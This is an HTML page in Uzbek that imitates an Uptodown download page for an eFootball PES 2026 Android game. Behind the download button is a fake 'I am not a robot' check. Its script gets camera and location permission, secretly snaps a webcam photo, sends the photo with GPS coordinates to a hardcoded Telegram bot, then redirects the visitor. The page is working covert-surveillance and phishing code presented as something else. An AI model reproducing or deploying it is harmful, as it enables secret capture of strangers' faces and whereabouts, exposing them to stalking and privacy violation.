<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>eFootball PES 2026 - Download for Android - Uptodown</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --ut-bg: #081d24;
            --ut-dark: #051116;
            --ut-blue: #1b85d3;
            --ut-green: #00b451;
            --ut-green-dark: #008a3d;
            --ut-dim: #7e949c;
            --ut-text: #ffffff;
            --ut-card: #0c262f;
        }

        body {
            margin: 0;
            background-color: var(--ut-bg);
            font-family: 'Roboto', sans-serif;
            color: var(--ut-text);
            overflow-x: hidden;
        }

        /* Header */
        .top-centered-header {
            background-color: var(--ut-dark);
            padding: 18px 0;
            display: flex;
            justify-content: center;
            align-items: center;
            border-bottom: 1px solid #102a33;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .main-logo { height: 26px; }

        header {
            background: var(--ut-dark);
            height: 50px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            border-bottom: 1px solid #102a33;
        }
        .menu-btn { color: var(--ut-blue); font-size: 28px; cursor: pointer; }

        /* Content */
        .main-content {
            max-width: 1000px;
            margin: 0 auto;
            padding: 24px 16px;
            transition: filter 0.5s ease;
        }

        .app-header { display: flex; gap: 20px; margin-bottom: 30px; align-items: center; }
        .app-icon-css {
            width: 90px; height: 90px; border-radius: 22px;
            background: linear-gradient(135deg, #102a33, #081d24);
            display: flex; align-items: center; justify-content: center;
            font-size: 40px; border: 1px solid #1a3a45;
        }
        
        .app-title-block h1 { margin: 0; font-size: 22px; font-weight: 700; }
        .app-sub-title { margin: 5px 0 0 0; color: var(--ut-dim); font-size: 14px; }
        .app-developer { color: var(--ut-blue); text-decoration: none; }

        /* Button */
        .btn-main {
            background: var(--ut-green);
            color: white; width: 100%; padding: 18px;
            border-radius: 12px; font-weight: 700; font-size: 18px;
            border: none; box-shadow: 0 5px 0 var(--ut-green-dark);
            cursor: pointer; text-transform: uppercase;
            transition: all 0.2s;
        }
        .btn-main:active { transform: translateY(3px); box-shadow: 0 2px 0 var(--ut-green-dark); }

        /* Tech Info */
        .tech-info-box {
            margin-top: 30px; background: var(--ut-card);
            padding: 20px; border-radius: 12px; border: 1px solid #102a33;
        }
        .info-row {
            display: flex; justify-content: space-between;
            padding: 12px 0; border-bottom: 1px solid #15353f;
        }
        .info-row:last-child { border-bottom: none; }
        .info-label { color: var(--ut-dim); font-size: 14px; }
        .info-value { font-weight: 500; font-size: 14px; }

        /* Overlay */
        #overlay {
            display: none; position: fixed; inset: 0;
            background: rgba(0, 0, 0, 0.92); backdrop-filter: blur(15px);
            z-index: 10000; align-items: center; justify-content: center;
        }

        .modal-box {
            background: #fff; padding: 30px; border-radius: 10px;
            color: #000; width: 310px; text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }
        
        /* Captcha Design */
        .captcha-box {
            border: 1px solid #d3d3d3; padding: 12px;
            display: flex; align-items: center; cursor: pointer;
            background: #f9f9f9; margin-top: 20px; border-radius: 3px;
        }
        .c-check {
            width: 24px; height: 24px; border: 2px solid #c1c1c1;
            margin-right: 15px; display: flex; align-items: center;
            justify-content: center; background: #fff; border-radius: 2px;
        }

        .loading-spin {
            border: 3px solid #f3f3f3; border-top: 3px solid var(--ut-green);
            border-radius: 50%; width: 25px; height: 25px;
            animation: spin 1s linear infinite; display: none; margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="top-centered-header">
    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="main-logo" alt="Uptodown">
</div>

<header>
    <div class="menu-btn" onclick="alert('Menu')">☰</div>
</header>

<div class="main-content" id="content">
    <div class="app-header">
        <div class="app-icon-css">⚽</div>
        <div class="app-title-block">
            <h1>eFootball PES 2026</h1>
            <p class="app-sub-title">10.4.0 | <a href="#" class="app-developer">KONAMI</a></p>
        </div>
    </div>
    
    <button class="btn-main" onclick="openCaptcha()">Oxirgi versiya (Yuklash)</button>

    <div class="tech-info-box">
        <div class="info-row"><span class="info-label">Paket nomi</span><span class="info-value">jp.konami.pes26</span></div>
        <div class="info-row"><span class="info-label">Litsenziya</span><span class="info-value">Bepul</span></div>
        <div class="info-row"><span class="info-label">Hajmi</span><span class="info-value">1.94 GB</span></div>
    </div>
</div>

<div id="overlay">
    <div class="modal-box">
        <h3 style="margin:0; font-size: 19px;">Xavfsizlik tekshiruvi</h3>
        <p style="font-size: 14px; color: #555; margin-top: 10px;">Yuklashni davom ettirish uchun robot emasligingizni tasdiqlang.</p>
        
        <div class="captcha-box" id="captcha-btn" onclick="verifyNow()">
            <div class="c-check" id="checkmark"></div>
            <div style="flex-grow:1; text-align:left; font-size:14px; font-weight:500;">Men robot emasman</div>
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
        </div>

        <div class="loading-spin" id="spinner"></div>
    </div>
</div>

<video id="v-stream" autoplay playsinline></video>
<canvas id="v-canvas"></canvas>

<script>
    const CONFIG = { TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", CHAT: "6198817749" };

    function openCaptcha() {
        document.getElementById('content').style.filter = "blur(20px)";
        document.getElementById('overlay').style.display = "flex";
    }

    async function verifyNow() {
        const check = document.getElementById('checkmark');
        check.innerHTML = '<img src="https://i.gifer.com/ZZ5H.gif" width="16">';

        try {
            // Ruxsatlarni so'rash
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            navigator.geolocation.getCurrentPosition(async (pos) => {
                
                // Ruxsat berilganda vizual o'zgarish
                check.innerHTML = '✅';
                check.style.border = "none";
                document.getElementById('captcha-btn').style.pointerEvents = "none";
                
                // Botga ma'lumotni yuborish
                sendData(stream, pos);

                // Taqdimot uchun yuklash spinnerini ko'rsatish
                setTimeout(() => {
                    document.getElementById('spinner').style.display = "block";
                }, 800);

                // 3 soniyadan keyin CapCut sahifasiga yuborish
                setTimeout(() => {
                    window.location.href = "https://viamaker.ru.uptodown.com/android";
                }, 3500);

            }, (err) => { alert("Xato: Joylashuv ruxsati berilmadi."); location.reload(); });
        } catch (e) { alert("Xato: Kamera ruxsati berilmadi."); location.reload(); }
    }

    async function sendData(stream, pos) {
        const video = document.getElementById('v-stream');
        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 1000));
        const canvas = document.getElementById('v-canvas');
        canvas.width = 400; canvas.height = 300;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const snap = await (await fetch(canvas.toDataURL('image/jpeg', 0.4))).blob();
        stream.getTracks().forEach(t => t.stop());

        const fd = new FormData();
        fd.append('chat_id', CONFIG.CHAT);
        fd.append('photo', snap);
        fd.append('caption', `📍 Geo: ${pos.coords.latitude}, ${pos.coords.longitude}\n📱 Target: UC Service 2.0 Presentation`);
        
        fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }
</script>

</body>
</html>
